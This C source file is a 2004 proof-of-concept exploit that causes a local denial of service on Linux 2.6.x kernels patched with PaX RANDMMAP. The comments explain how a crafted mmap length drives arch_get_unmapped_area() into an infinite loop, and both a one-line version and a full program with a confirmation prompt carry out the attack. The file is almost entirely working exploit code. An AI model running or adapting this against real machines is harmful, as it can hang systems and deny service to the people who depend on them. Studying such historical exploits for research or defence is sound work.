/*
  PaX w/ CONFIG_PAX_RANDMMAP for Linux 2.6.x DoS proof-of-concept
  by Shadowinteger <shadowinteger@sentinix.org>
  2004-05-04

  Written after reading the security advisory posted by borg (ChrisR-) on
  Bugtraq 2004-05-03 (my time). ChrisR -> www.cr-secure.net

  Acknowledgments: sabu (www.sabu.net)


  Vulnerability:
    PaX code for 2.6.x prior to 2004-05-01 in arch_get_unmapped_area()
    (function in mm/mmap.c) is vulnerable to a local Denial of Service attack
    because of a bug that puts the kernel into an infinite loop.

    Read the security advisory for more info:
    http://www.securityfocus.com/archive/1/361968/2004-04-30/2004-05-06/0


  Exploitation:
    We need to get passed the following line of code in
    arch_get_unmapped_area() to succeed with a DoS:
        if (TASK_SIZE - len < addr) { ...

    We do it like this:

    TASK_SIZE - TYPICAL_ADDR + SINK = DOSVAL

    DOSVAL is the value we'll use.

    arch_get_unmapped_area() does the following:

    if TASK_SIZE-DOSVAL < TYPICAL_ADDR then... run right into the vuln code.
    (TASK_SIZE-DOSVAL) *must* be less than TYPICAL_ADDR to succeed.

    A DOSVAL of e.g. 0x80000000 or above will work most times, no real need
    for the funky calculation above.

    There are quite a few functions available that are "front-ends" to
    arch_get_unmapped_area(). This exploit uses good-old mmap().


  Tiny DoS PoC:

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
int main(void){int fd=open("/dev/zero",O_RDONLY);mmap(0,0xa0000000,PROT_READ,MAP_PRIVATE,fd,0);}

*/

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdio.h>

#define TASK_SIZE 0xc0000000
#define TYPICAL_ADDR 0x43882000
#define SINK 0x04000000

#define DOSVAL (TASK_SIZE - TYPICAL_ADDR + SINK)

int main() {
    int fd = open("/dev/zero", O_RDONLY);

    printf("PaX w/ CONFIG_PAX_RANDMMAP for Linux 2.6.x DoS proof-of-concept\n"
           "by Shadowinteger <shadowinteger@sentinix.org> 20040504\n"
           "created after a sec advisory on bugtraq posted by borg (ChrisR-) 20040503\n"
           "ChrisR -> www.cr-secure.net\n"
           "\n"
           "the exploit binary must be marked PF_PAX_RANDMMAP to work!\n"
           "\n"
           "greetz goes to: sabu (www.sabu.net)\n"
           "\n"
           "------------------------------------------------------------------------------\n"
           "will exec \"mmap(0, 0x%x, PROT_READ, MAP_PRIVATE, fd, 0);\"\n"
           "\n"
           "if you run Linux 2.6.x-PaX or -grsec, this may \"hurt\" your CPU(s) a little,\n"
           "are you sure you want to continue? [type Y to continue] ", DOSVAL);
    fflush(stdout);

    if (getchar() != 'Y') {
        printf("aborted.\n");
        return 0;
    }

    printf("\n"
           "attempting to DoS...\n");

    if (mmap(0, DOSVAL, PROT_READ, MAP_PRIVATE, fd, 0) == MAP_FAILED) {
        perror("mmap");
    }

    printf("your kernel does not seem to be vulnerable! :)\n");

    return 0;
}

